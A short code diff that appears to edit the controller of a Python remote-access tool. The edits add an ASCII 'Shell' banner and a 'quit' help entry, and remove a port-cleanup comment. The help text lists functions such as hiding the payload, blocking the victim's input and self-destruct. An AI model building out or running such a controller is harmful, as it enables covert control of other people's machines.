@@ -1,5 +1,3 @@
-# To remove the netstat configuration on port 5555
-# fuser -k 5555/tcp
 import socket
 import json
 import termcolor
@@ -66,6 +64,8 @@ def target_communication(target, ip):
         elif command[:5] == 'popup':
             pass
         elif command == 'banner':
+            ascii_art = text2art("Shell", "random")
+            banner = termcolor.colored(ascii_art,'yellow')
             print(banner)
         elif command == 'getip':
             result = output_recv(target)
@@ -138,6 +138,7 @@ kill                  ->  Program will stop and self distruct itself
 banner                ->  Show banner
 hide                  ->  Hide payload
 blockinput            ->  Input will be blocked
+quit                  ->  Quit the existing shell
             ''', 'yellow'))
         elif command == 'clear':
             os.system('clear')
